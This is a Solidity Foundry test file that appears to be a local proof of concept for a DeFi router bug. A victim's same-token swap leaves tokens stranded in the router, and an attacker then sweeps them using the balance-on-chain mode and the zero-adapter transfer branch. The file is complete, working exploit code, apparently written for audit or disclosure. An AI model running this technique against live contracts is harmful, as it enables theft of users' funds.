// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {RouterTestV2} from "test/v2/RouterV2.t.sol";
import {SwapUnit, SwapPath} from "contracts/v2/router/ITermMaxRouterV2.sol";

/// @notice Local-only proof of concept. Never deploy or run against a live chain.
contract RouterSameTokenBalanceSweepPoC is RouterTestV2 {
    function test_PoC_sameTokenInputCanBeSweptByAnotherCaller() public {
        uint256 victimAmount = 100e8;
        address attacker = makeAddr("attacker");

        // The victim submits a same-token path. The router pulls the input first,
        // then _executeSwapUnits skips the unit without paying the recipient.
        vm.startPrank(sender);
        res.debt.mint(sender, victimAmount);
        res.debt.approve(address(res.router), victimAmount);

        SwapUnit[] memory victimUnits = new SwapUnit[](1);
        victimUnits[0] = SwapUnit({
            adapter: address(0),
            tokenIn: address(res.debt),
            tokenOut: address(res.debt),
            swapData: ""
        });
        SwapPath[] memory victimPaths = new SwapPath[](1);
        victimPaths[0] = SwapPath({
            units: victimUnits,
            recipient: sender,
            inputAmount: victimAmount,
            useBalanceOnchain: false
        });

        res.router.swapTokens(victimPaths);
        vm.stopPrank();

        assertEq(res.debt.balanceOf(sender), 0, "victim input was pulled");
        assertEq(res.debt.balanceOf(address(res.router)), victimAmount, "input remained in router");

        // The attacker can use the public balance mode and the zero-adapter
        // direct-transfer branch. tokenOut only needs to differ from tokenIn.
        SwapUnit[] memory attackerUnits = new SwapUnit[](1);
        attackerUnits[0] = SwapUnit({
            adapter: address(0),
            tokenIn: address(res.debt),
            tokenOut: address(res.ft),
            swapData: ""
        });
        SwapPath[] memory attackerPaths = new SwapPath[](1);
        attackerPaths[0] = SwapPath({
            units: attackerUnits,
            recipient: attacker,
            inputAmount: 0,
            useBalanceOnchain: true
        });

        vm.prank(attacker);
        res.router.swapTokens(attackerPaths);

        assertEq(res.debt.balanceOf(attacker), victimAmount, "attacker swept victim funds");
        assertEq(res.debt.balanceOf(address(res.router)), 0, "router was drained");
    }
}
